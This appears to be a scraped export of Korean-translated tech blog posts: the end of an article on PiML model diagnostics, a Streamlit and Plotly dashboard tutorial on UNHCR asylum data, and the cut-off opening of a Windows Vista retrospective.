10은 선정된 모델에 대한 리더보드를 보여주며, 테스트 및 훈련 데이터셋에 대한 다섯 가지 모델 성능 지표를 보여줍니다. 이러한 지표는 (a) 정확도, (b) AUC-ROC: ROC 곡선 아래 영역, (c ) F1 점수: 정밀도와 재현율의 결합, (d) 로그 손실: 잘못된 예측에 대해 벌점을 부과하고 예측의 불확실성을 고려합니다, (e) Brier 점수: 확률 예보의 정확성을 측정하는 데 사용됩니다. 예측 신뢰도를 평가해야 할 때 특히 유용합니다. 값 범위에 대한 내용: 정확도, AUC-ROC 및 F1 점수의 경우 높은 값이 더 나은 모델 성능을 나타내고, 로그 손실 및 Brier 점수의 경우 낮은 값이 더 나은 모델 성능을 나타냅니다.\n\n따라서 리더보드는 EBM 알고리즘이 모든 다른 모델보다 모든 지표에서 테스트 및 훈련 세트에서 뛰어남을 보여줍니다.\n\n<div class=\"content-ad\"></div>\n\nB.2.2 전역 및 지역 설명\n\n전역 설명에 관해, PiML은 다양한 측정치를 제공합니다: (a) 순열 피쳐 중요도, (b) 단변량 및 이변량 부분 의존도 플롯, 그리고 (c ) 누적 지역 효과. 피규어 11은 순열 피쳐 중요도 결과를 보여줍니다. '자본이익'이 가장 중요한 측정치라는 것을 알 수 있습니다. 직관적으로 이해하기 쉬운데, 과제가 50K 이상을 벌어들이는지 예측하고 싶기 때문입니다.\n\n<img src=\"/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_12.png\" />\n\n지역 설명에 대해, PiML은 LIME과 SHAP을 제공합니다. 피규어 12는 LIME 결과를 보여줍니다. 여기서 '자본이익'이 상당히 긍정적인 가중치를 가지고 해당 긍정적인 효과를 갖는 것을 관찰합니다. 이는 자본이익 증가가 모델의 출력값을 긍정적으로 이동시키는 것과 강하게 관련이 있다는 것을 의미합니다. '나이' 또한 긍정적인 가중치와 효과를 가지고 있어, 나이가 높아질수록 모델 결과에 긍정적으로 기여한다는 것을 의미합니다.\n\n<div class=\"content-ad\"></div>\n\n![image](/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_13.png)\n\n### B.2.3 Underperforming Slices Identification\n\nIn PiML, this analysis is referred to as 'weakspot' analysis. Underperformance can result from various factors, such as data issues (bias or inadequacy) or model problems (lack of complexity, overfitting, etc.). To conduct this analysis, we utilize the model_diagnose function, which will also be used for other types of analyses in the following sections, like robustness or reliability. The code snippet below demonstrates its application for 'weakspot' analysis.\n\nLet's delve into the different parameters. When calling the model_diagnose function, the following parameters are passed:\n\n<div class=\"content-ad\"></div>\n\n- 'model': 우리가 평가하고 싶은 모델입니다.\n- 'show': 우리가 하고 싶은 작업을 나타냅니다.\n- 'metric': 성능 메트릭입니다. 이는 위에서 논의한 다섯 가지 숫자 메트릭 중 하나일 수 있습니다.\n- 'slice_method': 데이터를 슬라이스하는 방법입니다. 히스토그램 또는 트리 중 하나일 수 있습니다.\n- 'slice_features': 슬라이스하는 데 사용할 1개 또는 2개의 특징입니다. 'marital_status' 특징을 사용할 것입니다.\n- 'threshold': 우리가 약한 지역과 좋은 지역을 구분하기 위해 사용할 성능 메트릭 '임계 비율'입니다. 우리는 기본 값 1.1을 사용할 것이며, 이는 모델 정확도 메트릭에서 10% 성능 하락에 해당합니다.\n- 'min_samples': 약한 지역으로 간주되기 위한 최소 샘플 크기를 지정합니다. 우리는 기본 값 20을 사용할 것입니다.\n- 'use_test': 이 매개변수는 훈련 데이터 또는 테스트 데이터를 사용할지를 지정합니다. 우리는 기본 값 False를 사용할 것이며, 이는 훈련 데이터를 사용할 것을 나타냅니다.\n\n약점 분석은 아래 그림 13에 나와 있으며, 두 개의 플롯으로 구성되어 있습니다.\n\n![그림 13](/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_14.png)\n\n상단 플롯은 'marital-status'의 함수로서 모델의 정확도를 나타내며, 버킷으로 분할됩니다. 단계별 함수는 'marital-status' 기능의 서로 다른 범위에서 모델의 정확도가 크게 변한다는 것을 나타냅니다. 빨간 점선은 원하는 임계 정확도를 나타냅니다. 빨간 '0' 마커는 모델의 정확도가 원하는 임계 미만인 특정 간격을 강조합니다.\n\n<div class=\"content-ad\"></div>\n\n하단 플롯은 데이터셋의 특징 값 히스토그램을 보여줍니다. 색상(“임계값 이상”은 파란색, “임계값 미만”은 연한 파란색)은 각 ‘marital-status’ 범주에서의 샘플이 성적 임계값을 초과하거나 미만한 횟수를 나타냅니다.\n\n이러한 진단용 플롯은 데이터의 특정 하위 그룹에서 모델 동작을 이해하는 데 중요합니다. 마찬가지로, 오버피팅 영역을 분석하기 위해 show 매개변수를 overfit으로 설정할 수 있습니다.\n\n히스토그램 X축에 표시된 정수 값과 데이터 레이블 간의 매핑 방법에 대해 여기에 노트를 추가하고 싶습니다. 여기에 코드가 있습니다:\n\n그리고 결과는 다음과 같습니다: '0: ‘Married’, 1: ‘NotMarried’, 2: ‘Separated’, 3: ‘Widowed’'\n\n<div class=\"content-ad\"></div>\n\nB.2.4 모델 신뢰성 분석\n\n이 유형의 분석은 불확실성을 계량화하기 위해 사용되는 일치 예측 프레임워크에 기반을 두고 있습니다 [2]. 여기서 모델 신뢰성이 모델 견고성과 어떻게 다른지에 주목하는 것이 중요합니다. 이것은 다음 섹션에서 논의될 것입니다. 신뢰성은 모델이 다른 일반 운영 모드에서 전반적으로 일관성 있는지에 중점을 두며, 견고성은 모델이 입력의 변화에 대처하는 능력에 중점을 둡니다. 특히 금융 부문과 같은 동적 환경에서 신뢰성 분석은 중요합니다.\n\n아래 코드 스니펫에서 'show' 매개변수의 값이 이제 'reliability_distance'이고, 'distance_metric'이라는 새 매개변수를 PSI 값으로 정의합니다. 이 코드는 Figure 14를 생성합니다.\n\n<div class=\"content-ad\"></div>\n\n위 그래프는 모델의 특성이 'Unreliable vs. Remaining Regions'간에 어떻게 분포가 변화하는지 보여주기 위해 인구 안정성 지수(PSI)를 사용하고 있습니다. PSI는 변수의 분포가 시간적으로나 다른 데이터셋 간에 얼마나 많이 변했는지를 측정하는 데 사용되는 지표입니다. 더 높은 PSI 값은 더 큰 변화를 나타내며, 이는 모델의 안정성에 문제가 될 수 있습니다.\n\n우리의 경우, 하나의 데이터셋을 다루고 있으며 높은 PSI 값은 해당 특성의 분포에 중요한 차이가 있다는 것을 나타냅니다. 이러한 세분화된 세그먼트는 지리적 지역, 연령 그룹 또는 다른 인구통계 요인에 의해 범주화될 수 있습니다. Figure 14에서 'relationship', 'marital-status', 'occupation' 특성은 상대적으로 높은 PSI 값이 나타납니다. 이는 데이터 하위 세그먼트에서 중요한 분포 변화가 있음을 나타냅니다. 반면에 'race', 'education', 'capital-loss'는 PSI 값이 낮아 해당 특성의 분포가 다른 데이터 세그먼트 간에 더 안정적임을 시사합니다.\n\n### 모델 견고성 분석\n\n모델의 견고성은 ML 모델이 다양한 시나리오에서 특히 새로운 데이터를 처리할 때 성능을 유지하는 능력을 말합니다. 모델 견고성의 측면에는 (a) 새로운 데이터에서 잘 동작하는 일반화 능력, (b) 입력값의 작은 변화에 크게 영향을 받지 않는 안정성, (c) 입력 데이터의 오류에 영향을 받지 않는 노이즈 허용성이 포함됩니다.\n\n<div class=\"content-ad\"></div>\n\n도형 15에 나타난 그래프는 EBM 모델의 모든 피처에 대한 교란(즉, 의도적인 변화)이 어떤 영향을 미치는지를 보여줍니다. 아래는 해당 그래프를 생성한 코드입니다. 'perturb_size'는 교란의 단계 크기를 나타내며, 'perturb_method'는 'quantile'로 설정되어 있습니다. 이 매개변수에는 'raw'와 'quantile' 두 가지 선택지가 있습니다. 'raw' 값은 피처에 가우시안 노이즈가 추가됨을 의미하며, 많은 피처가 이산형임을 감안할 때 'quantile' 값이 더 나은 선택입니다. 이 값은 사분위 범위 내의 교란을 의미합니다.\n\n![그래프](/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_16.png)\n\n그래프의 X축에는 교란 크기가, Y축에는 정확도 메트릭이 표시됩니다. 플롯 요소는 모델 정확도의 분포를 나타내는 상자 그림입니다. 특이치는 모델의 정확도가 대부분의 데이터와 현저하게 다른 지점을 보여줍니다.\n\n제로 교란은 데이터에 대한 수정 없이 모델의 기본 성능을 나타냅니다. 모델은 최고의 성능을 발휘하며, 높은 중앙값 정확도와 견고한 IQR로 나타납니다. 교란 크기가 커질수록 정확도가 저하하는 경향이 뚜렷하게 나타납니다. 이는 입력 데이터가 점점 교란을 받을수록 모델의 정확도가 낮아진다는 것을 나타냅니다. 예상대로, 성능 저하는 교란이 커질수록 더욱 뚜렷해집니다.\n\n<div class=\"content-ad\"></div>\n\n이 유형의 분석은 모델이 입력 데이터의 변화에 얼마나 민감한지 이해하는 데 중요하며, 입력 데이터가 훈련 중에 본 조건과 다를 수 있는 실제 시나리오에서 모델이 얼마나 잘 수행될 수 있는지를 평가하는 데 도움이 될 수 있습니다.\n\nB.2.6 세분화된 진단 분석\n\n우리가 논의할 마지막 유형의 분석은 특히 유용한데, 이는 개별 기능에 대한 심층적인 살피기를 통해 가장 취약한 영역을 찾는 데 도움이 됩니다. 아래 코드 스니펫을 사용하여 예제를 생성합니다. 모델 XGB1의 경우, 코드는 '교육'의 다른 세그먼트가 정확도와 같은 기본 성능 측정에 대해 어떻게 수행되고 있는지 보여줍니다. '교육'은 범주형 기능이며 균일하게 세분화될 것입니다.\n\n결과는 아래와 같습니다. 세그먼트 ID는 정확도를 오름차순으로 정렬하여 할당됩니다. 따라서 세그먼트 ID=0은 가장 낮은 정확도를 가진 세그먼트 2에 할당됩니다. 크기 매개변수는 세그먼트에 포함된 샘플 수를 보여줍니다. 가장 낮은 정확도를 가진 세그먼트에는 가장 적은 수의 샘플이 포함되어 있는 것은 좋은 소식입니다.\n\n<div class=\"content-ad\"></div>\n\n위 결과를 더 자세히 조사할 수 있습니다. 특히 가장 낮은 정확도를 보여주는 세그먼트 0을 살펴볼 필요가 있습니다. 아래 코드 조각은 'show' 매개변수에 'accuracy_table' 값을 할당하여 이를 수행합니다.\n\n결과는 아래 테이블 3에서 표시됩니다. 해당 테이블은 다섯 가지 숫자 성능 측정 항목과 세그먼트 0의 훈련 데이터와 테스트 데이터 간의 성능 차이에 대한 중요한 정보를 보여줍니다. 또한, 위의 정확도 테이블에 표시된 수치가 테스트 데이터의 가장 낮은 정확도였음을 알 수 있습니다.\n\n결론\n\nYellowbrick와 PiML은 데이터 과학자와 분석가들에게 모델 동작에 대한 이해를 심화하고자 하는 사람들에게 가치 있는 자원을 제공합니다. 이 도구들이 제공하는 시각화와 통찰력을 통해 사용자들은 데이터 품질 및 모델 성능과 관련된 여러 문제를 해결하고 이를 개선할 수 있습니다. 이를 통해 다양한 시나리오와 데이터 세그먼트에 대해 정확하고 견고하며 신뢰할 수 있는 모델을 보유할 수 있습니다. 이 글에서는 이러한 패키지의 일부 기능만 다루었습니다. 특히 PiML은 데이터 품질 평가, 모델 내구성 등과 같은 다양한 기능을 제공합니다.\n\n<div class=\"content-ad\"></div>\n\n또한, 오늘날 증가하는 개인정보 보호에 대한 우려를 고려할 때, 로컬에서 작업하는 것이 사이버 보안 계획의 중요한 측면이 될 수 있습니다. 또 다른 문제는 오늘날 데이터의 증가하는 복잡성입니다. 이미지, 오디오 및 텍스트가로 결합되는 로봇학 및 다중 모달 LLM을 사용한 상황 객체 감지와 같은 다중 모달 응용 프로그램이 있습니다. 이러한 모든 모달리티의 관심 대상은 가능한 정확하게 모델링되어야 하므로, 다양한 모델의 다른 측면을 어떻게 평가하는지에 대해 알고하는 것이 중요합니다. \n\n모든 논의된 예제의 코드는 제 Github 저장소에서 찾을 수 있습니다: [https://github.com/theomitsa/Yellowbrik-PIML](https://github.com/theomitsa/Yellowbrik-PIML)\n\n독자 여러분, 읽어 주셔서 감사합니다!\n\n# 참고문헌\n\n<div class=\"content-ad\"></div>\n\n- Kaggle 노트북, 소득 분류 모델, https://www.kaggle.com/code/jieyima/income-classification-model\n\n2. Manokhin, V., Practical Guide to Applied Conformal Prediction in Python: Learn and Apply The Best Uncertainty Frameworks to Your Industry Applications, Packt Publishing, December 2023.\n\n# 사용된 데이터셋\n\n- 와인 데이터셋: UCI Machine Learning Repository, https://archive.ics.uci.edu/dataset/109/wine, 라이센스: 본 데이터셋은 크리에이티브 커먼즈 저작자표시 4.0 국제 라이센스에 따라 라이센스가 부여됩니다.\n- 성인 (인구조사 소득) 데이터셋: UCI Machine Learning Repository, https://archive.ics.uci.edu/dataset/2/adult 라이센스: 본 데이터셋은 크리에이티브 커먼즈 저작자표시 4.0 국제 라이센스에 따라 라이센스가 부여됩니다.\n\n<div class=\"content-ad\"></div>\n\n**참고: \"저자가 아닌 경우, 모든 이미지는 저자에게 속합니다.\"**","ogImage":{"url":"/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_0.png"},"coverImage":"/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_0.png","tag":["Tech"],"readingTime":14},{"title":"Streamlit Plotly 대시보드 데이터 시각화를 위한 확실한 방법","description":"","date":"2024-05-20 18:25","slug":"2024-05-20-StreamlitPlotlyDashboardsASureFireDataVisualizationLoveAffair","content":"\n\n\n![StreamlitPlotlyDashboardsASureFireDataVisualizationLoveAffair](/assets/img/2024-05-20-StreamlitPlotlyDashboardsASureFireDataVisualizationLoveAffair_0.png)\n\nPython Streamlit은 인터랙티브 웹 인터페이스를 만드는 놀라운 프레임워크입니다.\n\nPython Plotly는 지도 및 차트와 같은 데이터 시각화를 효율적으로 만드는 훌륭한 라이브러리입니다. 데이터 시각화를 아름답게 표시합니다.\n\nStreamlit과 Plotly는 함께하면 천생연분입니다.\n\n\n<div class=\"content-ad\"></div>\n\n우리는 CSV 데이터 세트에서 여러 데이터 시각화를 웹 인터페이스에서 생성할 수 있고 다중 상호 작용 레이어(예: 슬라이더 및 드롭다운 메뉴)를 추가할 수 있습니다.\n\n모두 100 줄 미만의 코드로 가능합니다! 어떻게 할 수 있는지 보고 싶으세요?\n\n종합적이고 무료로 이용할 수 있는 데이터 세트를 사용하여 모든 것을 함께 해보겠습니다.\n\n# 데이터 세트 — UNHCR 난민 데이터\n\n<div class=\"content-ad\"></div>\n\nUNHCR(UN High Commission for Refugees)은 전 세계의 난민 이동에 대한 통계를 추적합니다.\n\n그들의 데이터는 여기에서 무료로 이용할 수 있습니다.\n\n다운로드 페이지에 도착한 후에는 선택한 데이터에 대해 자세히 볼 수 있습니다:\n\n![이미지](/assets/img/2024-05-20-StreamlitPlotlyDashboardsASureFireDataVisualizationLoveAffair_1.png)\n\n<div class=\"content-ad\"></div>\n\n이 프로젝트에서는 각 난민의 출신 국가와 피난국을 검색해 보겠습니다.\n\n이 데이터를 사용하여 다음을 보여주는 전 세계 맵과 차트를 만들 수 있습니다:\n- 출신 국가로부터 — 피난민이 어디로 가고 있는지\n- 피난국으로부터 — 피난민이 어디에서 왔는지\n\n데이터셋을 다운로드한 후, 스프레드시트 형식으로 열어서 다루고 있는 내용을 확인할 수 있습니다:\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-20-StreamlitPlotlyDashboardsASureFireDataVisualizationLoveAffair_2.png\" />\n\n이 프로젝트에서 관심 있는 데이터 필드는 다음과 같습니다:\n\n- 출신 국가(3자리 ISO 코드 포함) — 망명을 찾는 사람이 어디에서 왔는지\n- 망명 국가(3자리 ISO 코드 포함) — 실제로 망명을 찾는 사람이 있는 곳\n- 인정된 결정 — 망명을 찾는 사람이 수락되었는지 여부(국가별 숫자 합계)\n\n출신 국가와 망명 국가 모두 3자리 ISO 코드를 가지고 있어서 등치지도를 만드는 데 사용할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n이것 정말 유용해요! 지도 만드는 과정을 크게 간소화해줘요. 이제 코딩에 돌입해봅시다!\n\n## 단계 1: 라이브러리 가져오기 및 환경 설정\n\n우선, 필요한 라이브러리를 가져와 Streamlit 애플리케이션의 페이지 레이아웃을 설정해야 합니다.\n\n<div class=\"content-ad\"></div>\n\n```python\nimport streamlit as st\nimport pandas as pd\nimport plotly.express as px\n\n# 페이지 레이아웃을 넓게 설정합니다\nst.set_page_config(layout=\"wide\")\n```\n\n- streamlit: 대화형 웹 애플리케이션을 만드는 데 사용됩니다.\n- pandas: 데이터 조작 및 분석에 사용됩니다.\n- plotly.express: 시각화를 생성하는 데 사용됩니다.\n\n또한 Streamlit을 지도와 차트의 시각화를 위해 넓은 레이아웃으로 구성합니다.\n\n## 단계 2: 데이터셋 로드하기 — UNHCR 데이터베이스에서 글로벌 통계\n\n<div class=\"content-ad\"></div>\n\n이제 우리는 피난 심사 결정을 포함한 데이터셋을 로드합니다.\n\n```js\n# 데이터셋 로드\nfile_path = 'asylum-decisions.csv'\ndf = pd.read_csv(file_path)\n```\n\n우리는 pandas를 사용하여 CSV 파일을 DataFrame으로 읽어옵니다.\n\n데이터 프레임을 만든 후에는 맵과 차트에 필요한 데이터를 설정하기 위해 가공할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n## 단계 3: 고유 년도 및 국가 추출\n\n우선적으로 데이터셋에서 고유한 년도와 국가를 추출합니다. 이 단계의 목적은 Streamlit 인터페이스의 슬라이더 및 드롭다운 메뉴를 채우는 것입니다:\n\n```python\n# 고유한 연도 추출 및 두 열의 고유 국가를 결합하여 드롭다운 메뉴 생성\nyears = sorted(df['Year'].unique())\ncountries = sorted(set(df['Country of origin']).union(set(df['Country of asylum'])))\n```\n\nunique() 함수는 슬라이더에 중복된 연도가 없고 원천/유학국에 중복된 국가가 없도록합니다.\n\n<div class=\"content-ad\"></div>\n\norigin/asylum에 대한 연합을 수행함으로써 데이터셋에서 어떤 국가도 빠뜨리지 않도록 보장합니다.\n\n## 단계 4: Streamlit 인터페이스 생성\n\n데이터를 준비한 후에는 Streamlit 사용자 인터페이스 구성 요소를 선택하는 데 사용할 수 있습니다.\n\n```js\n# Streamlit 인터페이스\nst.subheader(\"Asylum Decisions Visualization\")\n\n# 연도 및 국가 선택 슬라이더 및 드롭다운\nselected_year = st.slider(\"연도 선택\", min_value=int(years[0]), max_value=int(years[-1]), step=1, key=\"year_slider\")\nselected_country = st.selectbox(\"국가 선택\", countries, key=\"country_select\")\n```\n\n<div class=\"content-ad\"></div>\n\n첫 번째 줄은 작은 헤더를 만드는 것입니다. 그런 다음 다음을 만들어야 합니다:\n\n- 슬라이더: 사용자가 이전에 작성한 연도 데이터 프레임에서 연도를 선택할 수 있게 합니다.\n- 드롭다운(선택 상자): 사용자가 이전에 생성한 국가 데이터 프레임에서 국가를 선택할 수 있게 합니다.\n\n## 단계 5: 데이터 필터링\n\n선택한 연도와 피난국을 기반으로 데이터셋을 필터링하여 시각화를 위해 준비합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\n# 선택한 연도와 국가를 기준으로 데이터 세트 필터링하기\nfiltered_df_origin = df[(df['연도'] == 선택한_연도) & (df['출신 국가'] == 선택한_국가)]\nfiltered_df_asylum = df[(df['연도'] == 선택한_연도) & (df['안보 국가'] == 선택한_국가)]\n\n# 0 값을 포함한 출신 국가 데이터\norigin_data = filtered_df_asylum.groupby('출신 국가')['인정된 결정'].sum().reset_index()\nall_countries_origin = pd.DataFrame(countries, columns=['출신 국가'])\norigin_data = all_countries_origin.merge(origin_data, on='출신 국가', how='left').fillna(0)\n\n# 0 값을 포함한 안보 국가 데이터\nasylum_data = filtered_df_origin.groupby('안보 국가')['인정된 결정'].sum().reset_index()\nall_countries_asylum = pd.DataFrame(countries, columns=['안보 국가'])\nasylum_data = all_countries_asylum.merge(asylum_data, on='안보 국가', how='left').fillna(0)\n```\n\n여기서 첫 번째 단계는 데이터를 연도별로 분리하는 것입니다. 이는 슬라이더로 선택한 연도에 따라 각 국가로 분리된 데이터를 만드는 과정입니다. 그 다음으로 모든 국가에 값이 있는지 확인하기 위해 fillna() 함수를 사용하여 모든 빈 열에 0을 추가합니다.\n\n## 단계 6: 코로플레스 맵 생성하기\n\n\n<div class=\"content-ad\"></div>\n\n우리가 원산지 및 피난처 국가별 데이터 프레임을 가지고 나면, 각 데이터 프레임을 시각화하기 위해 두 개의 코로플레스 맵을 생성합니다:\n\n```js\n# 맵 생성\nfig_origin = px.choropleth(origin_data, locations=\"Country of origin\", locationmode=\"country names\",\n                           color=\"Recognized decisions\", hover_name=\"Country of origin\",\n                           projection=\"natural earth\", color_continuous_scale=\"YlOrRd\",\n                           title=\"원산지 국가\", template=\"plotly_dark\")\n\nfig_asylum = px.choropleth(asylum_data, locations=\"Country of asylum\", locationmode=\"country names\",\n                           color=\"Recognized decisions\", hover_name=\"Country of asylum\",\n                           projection=\"natural earth\", color_continuous_scale=\"YlOrRd\",\n                           title=\"피난처 국가\", template=\"plotly_dark\")\n```\n\n우리가 사용하는 메서드 및 속성에 대한 몇 가지 세부 정보:\n\n- px.choropleth(): 코로플레스 맵을 만드는 주요 plotly 메서드. 이 메서드를 사용하여 원산지 및 피난처 2개의 맵을 그립니다.\n- locations: 위치 이름이 있는 열을 지정합니다 (첫 번째 맵의 경우 원산지 국가이고, 두 번째 맵의 경우 피난처 국가입니다).\n- locationmode: 위치 이름을 해석하는 방법을 지정합니다.\n- color: 맵을 색칠하는 데 사용할 열을 지정합니다 (Recognized decisions 열의 값에 기초합니다).\n- hover_name: 위치를 가리킬 때 표시할 열을 지정합니다.\n- projection: 맵 투영 유형을 지정합니다.\n\n<div class=\"content-ad\"></div>\n\n우리는 또한 제목, 색상 궁합(YlOrRd) 및 템플릿을 설정했습니다.\n\n![이미지](/assets/img/2024-05-20-StreamlitPlotlyDashboardsASureFireDataVisualizationLoveAffair_3.png)\n\n각 지도는 위 예제와 유사하게 보일 것입니다(데이터에 따라 다름). 이 예제는 2017년 캐나다로의 망명 신청자를 위한 것입니다.\n\n## 7단계: 막대 차트 생성하기\n\n<div class=\"content-ad\"></div>\n\n다음으로, 인정된 결정에 따른 상위 10개 국가에 대한 수평 막대 차트를 생성합니다:\n\n```js\n# 상위 10개 국가에 대한 막대 차트 생성\ntop_origin_data = origin_data.nlargest(10, 'Recognized decisions')  # 출신 국가 상위 10개\ntop_asylum_data = asylum_data.nlargest(10, 'Recognized decisions')  # 피난 국가 상위 10개\n\nfig_bar_origin = px.bar(top_origin_data, x='Recognized decisions', y='Country of origin',\n                        orientation='h', color='Recognized decisions', color_continuous_scale='YlOrRd',\n                        title='출신 국가 상위 10개')\n\nfig_bar_asylum = px.bar(top_asylum_data, x='Recognized decisions', y='Country of asylum',\n                        orientation='h', color='Recognized decisions', color_continuous_scale='YlOrRd',\n                        title='피난 국가 상위 10개')\n# 막대 순서 변경\nfig_bar_origin.update_layout(yaxis=dict(categoryorder='total ascending'))\nfig_bar_asylum.update_layout(yaxis=dict(categoryorder='total ascending'))\n```\n\n여기서는 나라 이름의 길이가 다양하기 때문에 수평 막대 차트가 가장 적합합니다. 이 코드 조각에 대해:\n\n- px.bar: 막대 차트 생성 (출신 데이터와 피난 데이터 각각 하나씩)\n- orientation='h': 막대 차트가 수평임을 지정합니다.\n- categoryorder='total ascending': 막대 순서를 반전시킵니다. 각 차트를 미학적으로 강조하기 위한 비필수적인 단계입니다.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-20-StreamlitPlotlyDashboardsASureFireDataVisualizationLoveAffair_4.png\" />\n\n위 예제와 비슷한 차트가 생성될 것입니다.\n\n멋지네요. 이제 2개의 지도와 2개의 차트를 생성했으니, Streamlit 대시보드에 이 모든 것을 함께 표시할 수 있습니다.\n\n## 단계 8: 지도 및 막대 차트 표시하기\n\n<div class=\"content-ad\"></div>\n\n끝으로, Streamlit 인터페이스에서 지도와 막대 차트를 옆에 나란히 표시합니다.\n\n```js\n# 지도와 막대 차트를 옆에 표시하기\ncol1, col2 = st.columns(2)\n\nwith col1:\n    st.plotly_chart(fig_origin, use_container_width=True)\n    st.plotly_chart(fig_bar_origin, use_container_width=True)\n\nwith col2:\n    st.plotly_chart(fig_asylum, use_container_width=True)\n    st.plotly_chart(fig_bar_asylum, use_container_width=True)\n```\n\n이 코드 스니펫에 대한 설명:\n\n- st.columns: 시각화 요소를 옆에 배치할 수 있는 열을 생성합니다.\n- st.plotly_chart: Streamlit 앱에서 Plotly 차트를 표시합니다.\n\n<div class=\"content-ad\"></div>\n\n와 놀라운 결과가 있습니다:\n\n![이미지](/assets/img/2024-05-20-StreamlitPlotlyDashboardsASureFireDataVisualizationLoveAffair_5.png)\n\n이 정말 멋집니다.\n\n우리는 이 모두를 코드가 100줄 미만으로(내 예제 Python 파일에는 82줄) 구현했습니다.\n\n<div class=\"content-ad\"></div>\n\n잘 진행되었으면 좋겠네요. 함께 와 주셔서 감사합니다.\n\n# 요약하면...\n\n이 Python 코딩 단계를 따라가며, Streamlit과 Plotly를 사용하여 망명 결정을 시각화하는 대화형 웹 애플리케이션을 만들어 보았습니다.\n\n사용자들은 슬라이더를 사용하여 국가를 선택하고, 해당 국가로 이동하는 난민의 움직임에 대한 다중 시각적 집중을 제공할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\nPython의 Streamlit과 Plotly를 함께 사용하는 큰 장점 중 하나는 놀라울만큼 효율적인 코드를 만들 수 있다는 것입니다.\n\nPlotly는 지도 및 차트 시각화를 생성하는 데 최적화되어 있고 Streamlit은 웹 인터페이스를 생성하는 데 최적화되어 있습니다.\n\n완벽한 조합이라고 말할 수 있겠죠.\n\n읽어 주셔서 감사합니다.\n\n<div class=\"content-ad\"></div>\n\n만약 이 유형의 이야기가 당신의 취향이고, 저를 작가로 지원하고 싶다면, 제 Substack를 구독해주세요.\n\nSubstack에서는 매주 뉴스레터와 다른 플랫폼에는 없는 기사들을 발행합니다.","ogImage":{"url":"/assets/img/2024-05-20-StreamlitPlotlyDashboardsASureFireDataVisualizationLoveAffair_0.png"},"coverImage":"/assets/img/2024-05-20-StreamlitPlotlyDashboardsASureFireDataVisualizationLoveAffair_0.png","tag":["Tech"],"readingTime":9},{"title":"참작자 시선으로 바라본 Vista의 진실","description":"","date":"2024-05-20 18:21","slug":"2024-05-20-WhatReallyHappenedwithVistaAnInsidersRetrospective","content":"\n\n![이미지](/assets/img/2024-05-20-WhatReallyHappenedwithVistaAnInsidersRetrospective_0.png)\n\n테리 크로울리의 신중한 블로그 글 \"윈도우 비스타의 실제 상황\"를 읽는 것을 즐겼어요. 테리는 오피스 조직에서 일했고, 윈도우 비스타와 관련이 있는 하지만 실패한 롱혼 프로젝트에 대한 복잡한 작업들을 파트너 엔지니어링팀의 중요한 관점에서 아주 잘 다루었습니다.\n\n그는 프로젝트에 영향을 미친 많은 문제들을 올바르게 식별했고, 그 중 어느 것도 여기에서 다시 논의하려는 것은 아니에요. 같은 사건에 대한 내부자의 시각을 제공하려고 노력하는 것이 공평하다고 생각했어요. 테리만큼 훌륭하고 철저하게 설명할 수는 없겠지만, 이 프로젝트에서 무엇이 잘못되었는지에 대해 조금이나마 밝혀 보고 싶어요. 윈도우 비스타의 원래 출시일로부터 10년이 지났지만, 그 교훈들은 이제 전에보다 더 중요한 것 같아요.\n\n윈도우는 거대한 시스템이에요. 수천 명의 개발자, 테스터, 프로그램 매니저, 보안 전문가, UI 디자이너, 아키텍트, 등등이 있어요. 그리고 그것은 지원 캐스트인 인사담당자, 채용담당자, 마케팅 담당자, 영업인, 변호사, 물론 많은 관리자들, 이사들, 각 분야의 부사장들까지 말이에요. 전체 앙상블 캐스트는 Microsoft 내외부의 파트너 팀에서 지원받는 많은 수많은 사람들에 의해 지원되어요. 그들은 플랫폼 아래쪽의 하드웨어부터 제공하고 있는 장치 드라이버와 응용 프로그램까지 모든 것을 제공해요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-20-WhatReallyHappenedwithVistaAnInsidersRetrospective_1.png\" />\n\n조직적으로 당시 Windows는 실제로 코어(Core), 서버(Server), 그리고 클라이언트(Client) 세 개의 팀이었습니다. 코어 팀은 운영 체계의 모든 필수 구성 요소인 \"배관 시설\"을 제공했으며(커널 자체, 스토리지, 보안, 네트워킹, 장치 드라이버, 설치 및 업그레이드 모델, Win32 등) 이는 모든 Windows 버전에서 공유되었습니다. 서버 팀은 다시 말해 서버 시장에서 필요한 기술(터미널 서비스, 클러스터링 및 고가용성, 기업 관리 도구 등)에 집중했고, 클라이언트 팀은 브라우저, 미디어 플레이어, 그래픽, 쉘 등 데스크톱 및 소비자 출시와 관련된 기술을 담당했습니다. 이 플랫폼은 많은 고객을 위해 서비스하는 데 논리적인 조직 구조로 보였습니다.\n\n물론 많은 조직 재편이 있었지만, Windows가 인기를 얻고 팀이 커지는 가운데서도 해당 기본 구조는 유지되었습니다.\n\n문화적으로나 조직적으로 말하자면, 코어 팀은 클라이언트 팀보다 서버 팀에 더 가까웠다고 말할 수 있습니다. 적어도 Vista 출시 이후까지는 그랬습니다. 이는 서버 플랫폼 요구 사항을 고려한 \"코어\" 팀 프로젝트에 더 많은 중점이 두어졌음을 의미했습니다: 더 많은 확장성 노력, 더 많은 중복 기능, OS 출시에서 기업 요구 사항을 더 많이 다루는 등, Windows가 이미 주도하는 소비자 데스크톱 시장뿐만 아니라 수익성이 높은 서버 시장에 대응하기 위해 성장하는 동안 기울이는 노력입니다.\n\n<div class=\"content-ad\"></div>\n\n저는 1998년 초에 마이크로소프트에 도착했을 때, Windows라고 하면 Windows NT를 가리켰습니다. 아키텍처적으로, 조직적으로, 그리고 제품 적으로 모두 Windows 95 코드 베이스는 대부분 버려졌고 Windows NT가 노트북부터 클러스터 데이터베이스 서버까지 모든 유형의 Windows에 